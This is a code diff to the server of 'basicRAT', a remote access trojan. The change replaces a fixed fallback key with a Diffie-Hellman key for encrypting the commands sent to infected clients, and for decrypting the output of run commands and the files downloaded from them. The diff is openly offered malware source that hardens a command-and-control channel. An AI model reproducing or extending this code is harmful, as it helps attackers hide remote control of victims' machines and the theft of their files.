@@ -47,7 +47,8 @@ def main():
 
     s.listen(10)
     conn, addr = s.accept()
-
+    DHKEY = diffiehellman(conn, server=True)
+    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
     while True:
         prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip().split()
 
@@ -69,7 +70,7 @@ def main():
 
         # send data to client
         data = '{} {}'.format(cmd, action).rstrip()
-        conn.send(encrypt(data, FALLBACK_KEY))
+        conn.send(encrypt(data, DHKEY))
 
         # stop server
         if cmd == 'quit':
@@ -79,7 +80,7 @@ def main():
         # results of command
         elif cmd == 'run':
             recv_data = conn.recv(4096)
-            print decrypt(recv_data, FALLBACK_KEY)
+            print decrypt(recv_data, DHKEY)
 
         # download a file
         elif cmd == 'download':
@@ -90,7 +91,7 @@ def main():
                     recv_data = conn.recv(1024)
                     if not recv_data:
                         break
-                    f.write(decrypt(recv_data, FALLBACK_KEY))
+                    f.write(decrypt(recv_data, DHKEY))
                     
         else:
             print "Invalid command"
